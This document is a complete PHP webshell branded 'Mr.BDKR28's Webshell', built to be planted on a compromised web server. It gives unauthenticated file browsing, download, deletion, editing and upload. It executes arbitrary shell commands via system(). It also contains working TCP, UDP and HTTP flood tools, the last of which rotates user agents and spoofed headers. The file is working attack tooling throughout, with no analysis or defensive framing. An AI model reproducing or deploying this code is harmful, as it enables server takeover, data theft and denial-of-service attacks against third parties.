<html><link rel='icon' href='https://i.ibb.co/yy44TbD/Screenshot-20241108-210852-Telegram.jpg' sizes='20x20' type='image/png'>

<?php


echo "<html><head><title>Mr.BDKR28'S Webshell</title></head>";
echo "<body style='background-color: #000000; color: #ff0000; font-family: monospace;'>";

echo "<div style='text-align: center; font-size: 24px; font-weight: bold; padding: 10px; color: #ff0000; border-bottom: 2px solid #ff000;'>Mr.BDKR28's Webshell</div>";

$user_ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

$location = 'Unknown';
$ipInfo = @file_get_contents("http://ip-api.com/json/{$user_ip}");
if ($ipInfo) {
    $ipData = json_decode($ipInfo, true);
    if ($ipData && $ipData['status'] === 'success') {
        $location = "{$ipData['city']}, {$ipData['country']}";
    }
}

echo "<div style='border: 1px solid #ff0000; padding: 10px; margin: 10px;'>";
echo "<div style='padding: 5px; border-bottom: 1px solid #ff0000;'><b>User IP:</b> $user_ip</div>";
echo "<div style='padding: 5px; border-bottom: 1px solid #ff0000;'><b>User Agent:</b> $user_agent</div>";
echo "<div style='padding: 5px;'><b>Location:</b> $location</div>";
echo "</div>";

$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();

echo "<h2 style='color: #ff0000;'>Current Directory: $dir</h2>";
echo "<p><a href='?dir=" . dirname($dir) . "' style='color: #ff0000;'>Go up</a></p>";

echo "<div style='border: 1px solid #ff0000; padding: 10px; margin-bottom: 20px;'>";
echo "<h3 style='color: #ff0000;'>File Manager</h3>";
foreach (scandir($dir) as $file) {
    if ($file == "." || $file == "..") continue;
    $filepath = "$dir/$file";
    echo "<div style='border: 1px solid #ff0000; padding: 5px; margin: 5px;'>";
    if (is_dir($filepath)) {
        echo "<a href='?dir=$filepath' style='color: red;'>[DIR] $file</a>";
    } else {
        echo "$file ";
        echo "<a href='?dir=$dir&download=$file' style='color: lightblue;'>[Download]</a> ";
        echo "<a href='?dir=$dir&delete=$file' style='color: red;'>[Delete]</a> ";
        echo "<a href='?dir=$dir&edit=$file' style='color: yellow;'>[Edit]</a>";
    }
    echo "</div>";
}
echo "</div>";

if (isset($_GET['download'])) {
    $file = "$dir/" . $_GET['download'];
    if (file_exists($file)) {
        header('Content-Type: application/octet-stream');
        header("Content-Disposition: attachment; filename=" . basename($file));
        readfile($file);
        exit;
    }
}

if (isset($_GET['delete'])) {
    $file = "$dir/" . $_GET['delete'];
    if (file_exists($file) && unlink($file)) {
        echo "<p style='color: red;'>File deleted successfully.</p>";
    } else {
        echo "<p style='color: red;'>Failed to delete file.</p>";
    }
}

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
    $uploadPath = $dir . '/' . $_FILES['file']['name'];
    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath)) {
        echo "<p style='color: lightgreen;'>File uploaded successfully: <b>{$uploadPath}</b></p>";
    } else {
        echo "<p style='color: red;'>Failed to upload file.</p>";
    }
}

if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    echo "<div style='border: 1px solid #ff0000; padding: 10px; margin-top: 20px;'><b>Command:</b> $cmd<pre>";
    system($cmd);
    echo "</pre></div>";
}

if (isset($_GET['edit'])) {
    $editFile = "$dir/" . $_GET['edit'];
    if (file_exists($editFile)) {
        $content = htmlspecialchars(file_get_contents($editFile));
        echo "<form method='POST' action='?dir=$dir&edit={$_GET['edit']}'>
                <div style='border: 1px solid #ff0000; padding: 10px; margin-top: 20px;'>
                    <b>Edit File:</b>
                    <textarea name='file_content' rows='10' cols='50' style='width: 100%;'>{$content}</textarea><br>
                    <input type='submit' value='Save' style='color: blue;' />
                </div>
              </form>";
    }
}

if (isset($_POST['file_content']) && isset($_GET['edit'])) {
    $fileToEdit = "$dir/" . $_GET['edit'];
    file_put_contents($fileToEdit, $_POST['file_content']);
    echo "<p style='color: lightgreen;'>File updated successfully: <b>{$fileToEdit}</b></p>";
}

echo "
<form method='POST' enctype='multipart/form-data'>
    <div style='border: 1px solid #ff0000; padding: 10px; margin: 10px;'>
        <b>File Upload:</b> <input type='file' name='file' />
        <input type='submit' value='Upload' />
    </div>
</form>
<form method='POST'>
    <div style='border: 1px solid #ff0000; padding: 10px; margin: 10px;'>
        <b>Command Execution:</b> <input type='text' name='cmd' />
        <input type='submit' value='Execute' />
    </div>
</form>";


if (isset($_POST['ddos_stop'])) {
    $_SESSION['ddos_running'] = false;
    echo "<div style='color: red;'>DDoS attack stopped.</div>";
}

if (isset($_POST['http_ddos_stop'])) {
    $_SESSION['http_ddos_running'] = false; 
    echo "<div style='color: red;'>HTTP DDoS attack stopped.</div>";
}

if (isset($_POST['ddos_start']) && !isset($_SESSION['ddos_running'])) {
    $_SESSION['ddos_running'] = true; 
    
    $target_ip = $_POST['target_ip'];
    $target_port = $_POST['target_port'];
    $protocol = $_POST['protocol'];
    $duration = $_POST['duration'];

    if ($protocol == 'TCP') {
        $end_time = time() + $duration;
        echo "<div style='color: lightgreen;'>Starting TCP DDoS attack on $target_ip:$target_port for $duration seconds...</div>";

        while (time() < $end_time && $_SESSION['ddos_running']) {
            for ($i = 0; $i < 5000; $i++) {
                $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
                if ($sock !== false) {
                    @socket_connect($sock, $target_ip, $target_port);
                    $data = str_repeat('A', 8192);
                    @socket_send($sock, $data, strlen($data), 0);
                    socket_close($sock);
                }
            }
            usleep(100);
        }
    } elseif ($protocol == 'UDP') {
        $end_time = time() + $duration; 
        echo "<div style='color: lightgreen;'>Starting UDP DDoS attack on $target_ip:$target_port for $duration seconds...</div>";

        $num_threads = 100; 
        $requests_per_thread = 10; 
        $packet = str_repeat("XxXxXxXxX", 65507);

        for ($t = 0; $t < $num_threads; $t++) {
            $thread_end_time = $end_time;
            while (time() < $thread_end_time && $_SESSION['ddos_running']) {
                for ($i = 0; $i < $requests_per_thread; $i++) {
                    $sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP); 
                    if ($sock !== false) {
                        @socket_sendto($sock, $packet, strlen($packet), 0, $target_ip, $target_port);
                        $_SESSION['packet_count']++;
                        socket_close($sock); 
                    }
                }
                usleep(1000);
            }
        }
    }
}

if (isset($_POST['http_ddos_start']) && !isset($_SESSION['http_ddos_running'])) {
    $_SESSION['http_ddos_running'] = true;
    
    $http_target = $_POST['http_target'];
    $http_method = $_POST['http_method'];
    $http_duration = $_POST['http_duration'];

    $user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
        "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
        "Mozilla/5.0 (Linux; Android 9; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
        "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        
    ];

    $fake_headers = [
        "X-Forwarded-For: 203.0.113.1",
        "X-Requested-With: XMLHttpRequest",
        "Referer: https://example.com/",
        "Accept-Language: en-US,en;q=0.5",
        "Accept-Encoding: gzip, deflate, br"
    ];

    echo "<div style='color: red;'>Starting HTTP DDoS attack on $http_target using $http_method for $http_duration seconds...</div>";
    $end_time = time() + $http_duration;

    while (time() < $end_time && $_SESSION['http_ddos_running']) {
        $url = parse_url($http_target);
        $host = $url['host'];
        $path = isset($url['path']) ? $url['path'] : '/';
        $user_agent = $user_agents[array_rand($user_agents)];
        $header = $fake_headers[array_rand($fake_headers)];

        for ($i = 0; $i < 500; $i++) { 
            $fp = fsockopen($host, 80, $errno, $errstr, 30);
            if ($fp) {
                $out = "$http_method $path HTTP/1.1\r\n";
                $out .= "Host: $host\r\n";
                $out .= "User-Agent: $user_agent\r\n";
                $out .= "$header\r\n";
                $out .= "Connection: Close\r\n\r\n";
                fwrite($fp, $out);
                fclose($fp);
            }

            usleep(rand(100, 500)); 
        }
    }
}

?>

<div style='border: 1px solid #ff0000; padding: 10px; margin-top: 20px;'>
    <h3 style='color: #ff000;'>DDoS Attack Configuration</h3>
    <form method='POST'>
        <label for='target_ip' style='color: #ff0000;'>Target IP:</label>
        <input type='text' name='target_ip' required /><br>
        <label for='target_port' style='color: #ff0000;'>Target Port:</label>
        <input type='number' name='target_port' required /><br>
        <label for='protocol' style='color: #ff0000;'>Protocol:</label>
        <select name='protocol'>
            <option value='TCP'>TCP</option>
            <option value='UDP'>UDP</option>
        </select><br>
        <label for='duration' style='color: #ff0000;'>Duration (seconds):</label>
        <input type='number' name='duration' required /><br>
        <input type='submit' name='ddos_start' value='Start DDoS' style='color: blue;' />
        <input type='submit' name='ddos_stop' value='Stop DDoS' style='color: red;' />
    </form>

    <h3 style='color: #ff0000;'>HTTP DDoS Attack Configuration</h3>
    <form method='POST'>
        <label for='http_target' style='color: #ff0000;'>HTTP Target URL:</label>
        <input type='text' name='http_target' required /><br>
        <label for='http_method' style='color: #ff0000;'>HTTP Method:</label>
        <select name='http_method'>
            <option value='GET'>GET</option>
            <option value='POST'>POST</option>
        </select><br>
        <label for='http_duration' style='color: #ff0000;'>Duration (seconds):</label>
        <input type='number' name='http_duration' required /><br>
        <input type='submit' name='http_ddos_start' value='Start HTTP DDoS' style='color: blue;' />
        <input type='submit' name='http_ddos_stop' value='Stop HTTP DDoS' style='color: red;' />
    </form>
</div>
</body>
</html>